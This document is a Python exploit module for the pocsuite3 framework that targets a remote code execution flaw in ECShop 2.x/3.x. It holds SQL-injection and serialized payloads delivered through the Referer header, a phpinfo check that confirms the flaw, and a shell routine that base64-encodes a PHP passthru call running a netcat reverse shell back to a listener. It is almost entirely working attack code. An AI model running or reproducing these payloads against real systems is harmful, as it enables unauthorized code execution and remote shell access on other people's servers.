#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# @Time     : 2020/11/26 16:48 
# @Author   : ordar
# @File     : 97343.py
# @Project  : pythonCourse
# @Python   : 3.7.5
import base64
from collections import OrderedDict
from urllib.parse import urljoin

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.core.interpreter_option import OptString
from pocsuite3.lib.utils import random_str
from requests.exceptions import ReadTimeout


class DemoPOC(POCBase):
    vulID = '97343'  # ssvid
    version = '3.0'
    author = ['seebug']
    vulDate = '2018-06-14'
    createDate = '2018-06-14'
    updateDate = '2018-06-14'
    references = ['https://www.seebug.org/vuldb/ssvid-97343']
    name = 'Ecshop 2.x/3.x Remote Code Execution'
    appPowerLink = ''
    appName = 'ECSHOP'
    appVersion = '2.x,3.x'
    vulType = 'Romote Code Execution'
    desc = '''
    '''
    samples = []
    install_requires = ['']



    def _verify(self):
        result = {}
        path = "user.php?act=login"
        url = urljoin(self.url, path)
        echashs = [
            '554fcae493e564ee0dc75bdf2ebf94ca',  # ECShop 2.x hash
            '45ea207d7a2b68c49582d2d22adf953a'  # ECShop 3.x hash
        ]

        for echash in echashs:
            payload = ('{0}ads|a:2:{{s:3:"num";s:116:"*/ select 1,0x2720756E696F6E202F2A,3,4,5,'
                       '6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10'
                       '-- -";s:2:"id";s:10:"\' union /*";}}{0}').format(echash)
            headers = {"Referer": payload}
            try:
                resp = requests.get(url, headers=headers)
                if resp and resp.status_code == 200 and "<title>phpinfo()</title>" in resp.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['Referer'] = payload
                    result['Stdout'] = payload
                    break
            except Exception as ex:
                pass
        print(result)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()

    def _shell(self):
        path = "user.php"
        url = urljoin(self.url, path)
        echashs = [
            '554fcae493e564ee0dc75bdf2ebf94ca',  # ECShop 2.x hash
            '45ea207d7a2b68c49582d2d22adf953a'  # ECShop 3.x hash
        ]

        cmd = REVERSE_PAYLOAD.NC.format(get_listener_ip(), get_listener_port())
        # cmd = REVERSE_PAYLOAD.BASH.format()
        phpcode = 'passthru("{0}");'.format(cmd)
        encoded_code = base64.b64encode(phpcode.encode())
        postdata = {
            'action': 'login',
            'vulnspy': 'eval/**/(base64_decode({0}));exit;'.format(encoded_code.decode()),
            'rnd': random_str(10)
        }

        for echash in echashs:
            payload = '{0}ads|a:3:{{s:3:"num";s:207:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:2:"id";s:9:"'"'"' union/*";s:4:"name";s:3:"ads";}}{1}'.format(echash, echash)
            headers = {"Referer": payload}
            try:
                resp = requests.post(url, data=postdata, headers=headers)
                if resp and resp.status_code == 200 and "<title>phpinfo()</title>" in resp.text:
                    break
            except ReadTimeout:
                break
            except Exception as ex:
                pass


register_poc(DemoPOC)
